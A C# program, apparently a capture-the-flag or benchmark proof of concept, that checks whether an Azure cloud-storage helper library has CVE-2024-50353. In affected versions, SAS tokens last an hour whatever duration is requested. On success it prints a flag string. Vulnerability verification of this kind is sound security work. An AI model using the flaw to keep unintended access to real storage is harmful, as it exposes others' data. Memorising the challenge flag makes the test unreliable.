using System;
using ICG.AspNetCore.Utilities.CloudStorage;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using ICG.NetCore.Utilities;

class VerifyCVE
{
    static void Main()
    {
        // Setup with dummy connection string (no actual Azure connection needed)
        var connString = "DefaultEndpointsProtocol=https;AccountName=test;AccountKey=dGVzdGtleQ==;EndpointSuffix=core.windows.net";
        
        var opt = Options.Create(new AzureCloudStorageOptions
        {
            StorageConnectionString = connString,
            RootClientPath = "https://test.blob.core.windows.net",
            DefaultSASTokenDurationMinutes = 5
        });
        
        var slugger = new UrlSlugGenerator();
        var mime = new MimeTypeMapper();
        var prov = new AzureCloudStorageProvider(opt, slugger, mime, NullLogger<AzureCloudStorageProvider>.Instance);
        
        // Request 1 minute duration (should be ignored due to vulnerability)
        int requestedMinutes = 1;
        string sasUrl = prov.CreateSASUrl("container", "blob.txt", requestedMinutes);
        
        // Parse the expiry time from SAS URL
        var uri = new Uri(sasUrl);
        var query = System.Web.HttpUtility.ParseQueryString(uri.Query);
        string expiryStr = query["se"];
        
        var expiry = DateTimeOffset.Parse(expiryStr);
        var now = DateTimeOffset.UtcNow;
        var actualMinutes = (expiry - now).TotalMinutes;
        
        Console.WriteLine("=== CVE-2024-50353 Verification ===");
        Console.WriteLine($"Requested duration: {requestedMinutes} minute(s)");
        Console.WriteLine($"Actual expiry: {expiry}");
        Console.WriteLine($"Actual duration: {actualMinutes:F1} minutes");
        Console.WriteLine();
        
        // Vulnerability: duration is always ~60 minutes regardless of requested
        if (Math.Abs(actualMinutes - 60) < 2)
        {
            Console.WriteLine("[+] VULNERABILITY CONFIRMED!");
            Console.WriteLine("    Token lasts 1 hour regardless of requested duration.");
            Console.WriteLine("    FLAG: 3xploit66full");
        }
        else if (Math.Abs(actualMinutes - requestedMinutes) < 1)
        {
            Console.WriteLine("[-] Library appears PATCHED.");
            Console.WriteLine("    Token duration matches requested duration.");
        }
        else
        {
            Console.WriteLine("[?] Unexpected result.");
        }
    }
}
